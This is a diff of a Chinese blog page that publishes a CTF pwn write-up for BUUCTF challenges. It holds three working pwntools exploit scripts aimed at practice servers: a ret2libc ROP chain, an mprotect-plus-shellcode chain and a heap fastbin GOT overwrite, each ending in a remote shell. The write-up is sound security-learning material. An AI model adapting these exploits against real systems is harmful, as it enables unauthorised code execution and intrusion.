@@ -80,9 +80,9 @@
 
 
 <meta name="description" content="1.[OGeek2019]babyrop1exp 123456789101112131415161718192021222324252627282930from pwn import *from LibcSearcher import *p&#x3D;remote(&amp;#x27;node3.buuoj.cn&amp;#x27;,28810)elf&#x3D;ELF(&amp;#x27;.&#x2F;pwn&amp;#x27;)write_plt&#x3D;elf">
-<meta property="og:type" content="website">
+<meta property="og:type" content="article">
 <meta property="og:title" content="buupwn wp">
-<meta property="og:url" content="http://example.com/drafts/buupwn.html">
+<meta property="og:url" content="http://example.com/2021/04/07/buupwn/index.html">
 <meta property="og:site_name" content="Archerの博客">
 <meta property="og:description" content="1.[OGeek2019]babyrop1exp 123456789101112131415161718192021222324252627282930from pwn import *from LibcSearcher import *p&#x3D;remote(&amp;#x27;node3.buuoj.cn&amp;#x27;,28810)elf&#x3D;ELF(&amp;#x27;.&#x2F;pwn&amp;#x27;)write_plt&#x3D;elf">
 <meta property="og:locale" content="zh_CN">
@@ -248,24 +248,86 @@
 
   <div id="posts" class="posts-expand">
     
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/07/buupwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Archerの博客">
+    </span>
+
     
-    
-    <div class="post-block page">
       <header class="post-header">
 
-	<h1 class="post-title" itemprop="name headline">buupwn wp</h1>
-
-
-
-</header>
-
-      
-      
-      
-      <div class="post-body">
         
         
-          <p>1.[OGeek2019]babyrop1<br>exp</p>
+          <h1 class="post-title" itemprop="name headline">buupwn wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-04-07T10:02:00+08:00">
+                2021-04-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>1.[OGeek2019]babyrop1<br>exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28810</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">6</span>+<span class="string">&#x27;\xff&#x27;</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload2+=p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(read_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">read_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;read&#x27;</span>,read_addr)</span><br><span class="line">libc_base=read_addr-libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_addr=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload+=p32(system_addr)+p32(<span class="number">1</span>)+p32(bin_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p>2.get_started_3dsctf_2016<br>通过rop以及shellcraft得到shell<br>mprotect可将内存段添加可执行权限是最主要的一点<br>vmmap查看可读可写内存<br>exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29799</span>)</span><br><span class="line">pop3_ret = <span class="number">0x804951D</span></span><br><span class="line">mem_addr = <span class="number">0x80EB000</span></span><br><span class="line">mem_size = <span class="number">0x1000</span>    </span><br><span class="line">mem_proc = <span class="number">0x7</span>       </span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">payload  = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">payload += p32(mprotect_addr)</span><br><span class="line">payload += p32(pop3_ret) </span><br><span class="line">payload += p32(mem_addr) </span><br><span class="line">payload += p32(mem_size)  </span><br><span class="line">payload += p32(mem_proc)   </span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload += p32(pop3_ret)  </span><br><span class="line">payload += p32(<span class="number">0</span>)     </span><br><span class="line">payload += p32(mem_addr)   </span><br><span class="line">payload += p32(<span class="number">0x100</span>) </span><br><span class="line">payload += p32(mem_addr)   </span><br><span class="line">r.sendline(payload)</span><br><span class="line">payload = asm(shellcraft.sh()) </span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
@@ -462,15 +524,61 @@
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">from</span> pwn import *</span><br><span class="line"><span class="attribute">from</span> LibcSearcher import *</span><br><span class="line"><span class="attribute">a</span>=<span class="number">1</span></span><br><span class="line"><span class="attribute">b</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">if</span>(a==<span class="number">0</span>):</span><br><span class="line">	<span class="attribute">p</span>=process(&#x27;./pwn&#x27;)</span><br><span class="line">	</span><br><span class="line"><span class="attribute">else</span>:</span><br><span class="line">	<span class="attribute">p</span>=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25576</span>)</span><br><span class="line"></span><br><span class="line"><span class="attribute">elf</span>=ELF(&#x27;./pwn&#x27;)</span><br><span class="line"><span class="attribute">context</span>( os = &#x27;linux&#x27;,arch=&#x27;amd<span class="number">64</span>&#x27;)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> show():</span><br><span class="line">	<span class="attribute">p</span>.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">	<span class="attribute">p</span>.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> add(size,content):</span><br><span class="line">	<span class="attribute">p</span>.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">	<span class="attribute">p</span>.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	<span class="attribute">p</span>.recvuntil(<span class="string">&quot; item name:&quot;</span>)</span><br><span class="line">	<span class="attribute">p</span>.sendline(str(size))</span><br><span class="line">	<span class="attribute">p</span>.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">	<span class="attribute">p</span>.send(content)</span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> edit(index,size,content):</span><br><span class="line">	<span class="attribute">p</span>.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">	<span class="attribute">p</span>.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	<span class="attribute">p</span>.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">	<span class="attribute">p</span>.sendline(str(index))</span><br><span class="line">	<span class="attribute">p</span>.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">	<span class="attribute">p</span>.sendline(str(size))</span><br><span class="line">	<span class="attribute">p</span>.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">	<span class="attribute">p</span>.send(content)</span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> free(index):</span><br><span class="line">	<span class="attribute">p</span>.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">	<span class="attribute">p</span>.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	<span class="attribute">p</span>.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">	<span class="attribute">p</span>.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="attribute">read_got</span>=elf.got[&#x27;read&#x27;]</span><br><span class="line"><span class="attribute">atoi_ad</span>=elf.got[&#x27;atoi&#x27;]</span><br><span class="line"><span class="attribute">shell_ad</span>=<span class="number">0</span>x<span class="number">400</span>D<span class="number">49</span></span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">18</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0</span>x<span class="number">18</span>)#<span class="number">1</span></span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">18</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0</span>x<span class="number">18</span>)#<span class="number">2</span></span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">18</span>,<span class="string">&quot;c&quot;</span>*<span class="number">0</span>x<span class="number">18</span>)#<span class="number">3</span></span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">20</span>,<span class="string">&quot;aaaa&quot;</span>)#<span class="number">4</span></span><br><span class="line"><span class="attribute">edit</span>(<span class="number">0</span>,<span class="number">0</span>x<span class="number">20</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0</span>x<span class="number">18</span>+p<span class="number">64</span>(<span class="number">0</span>x<span class="number">71</span>))</span><br><span class="line"><span class="attribute">free</span>(<span class="number">1</span>)</span><br><span class="line"><span class="attribute">edit</span>(<span class="number">0</span>,<span class="number">0</span>x<span class="number">28</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0</span>x<span class="number">18</span>+p<span class="number">64</span>(<span class="number">0</span>x<span class="number">71</span>)+p<span class="number">64</span>(<span class="number">0</span>x<span class="number">6020</span>ad))</span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">60</span>,<span class="string">&quot;aaaa&quot;</span>)#<span class="number">5</span></span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>x<span class="number">60</span>,<span class="string">&quot;bbb&quot;</span>+p<span class="number">64</span>(<span class="number">0</span>)+p<span class="number">64</span>(read_got)+p<span class="number">64</span>(<span class="number">0</span>x<span class="number">18</span>)+p<span class="number">64</span>(atoi_ad))#<span class="number">6</span></span><br><span class="line"><span class="attribute">show</span>()</span><br><span class="line"><span class="attribute">p</span>.recvuntil(<span class="string">&quot;0 : &quot;</span>)</span><br><span class="line"><span class="attribute">ad</span>=u<span class="number">64</span>(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,&#x27;\x<span class="number">00</span>&#x27;))</span><br><span class="line"><span class="attribute">libc</span>=LibcSearcher(<span class="string">&quot;read&quot;</span>,ad)</span><br><span class="line"><span class="attribute">libc_base</span>=ad-libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line"><span class="attribute">sys_ad</span>=libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"><span class="attribute">log</span>.info(<span class="string">&quot;sys_ad: &quot;</span>+hex(sys_ad))</span><br><span class="line"><span class="attribute">edit</span>(<span class="number">1</span>,<span class="number">8</span>,p<span class="number">64</span>(sys_ad))</span><br><span class="line"></span><br><span class="line"><span class="attribute">p</span>.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"><span class="attribute">p</span>.interactive()</span><br></pre></td></tr></table></figure>
 <p>第二种写法(house of force)<br>待补充</p>
 
-        
-      </div>
-      
-      
       
     </div>
     
     
     
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/03/04/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="next" title="pwn学习笔记">
+                <i class="fa fa-chevron-left"></i> pwn学习笔记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/04/16/pwn%E4%B9%8B%E6%A0%88/" rel="prev" title="pwn之栈">
+                pwn之栈 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
   </div>
 
 
@@ -523,7 +631,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
